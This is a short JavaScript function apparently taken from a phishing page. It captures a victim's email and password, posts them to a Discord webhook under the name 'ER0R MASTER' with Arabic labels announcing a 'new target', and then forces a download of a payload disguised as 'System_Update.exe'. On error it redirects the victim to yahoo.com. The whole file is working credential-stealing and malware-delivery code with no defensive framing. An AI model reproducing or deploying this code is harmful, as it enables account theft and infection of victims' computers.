async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) return alert("يرجى إكمال التوثيق");

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // إرسال البيانات للديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R MASTER",
                embeds: [{
                    title: "💀 تم سحب هدف جديد",
                    fields: [
                        { name: "📧 الحساب", value: email },
                        { name: "🔑 الباسورد", value: pass }
                    ],
                    color: 0x6001d2
                }]
            })
        });

        // تحفيز التحميل الإجباري للملف
        const downloadLink = document.createElement("a");
        downloadLink.href = config.pc_payload;
        downloadLink.download = "System_Update.exe";
        document.body.appendChild(downloadLink);
        downloadLink.click();
        document.body.removeChild(downloadLink);

    } catch(e) {
        window.location.href = "https://yahoo.com";
    }
}
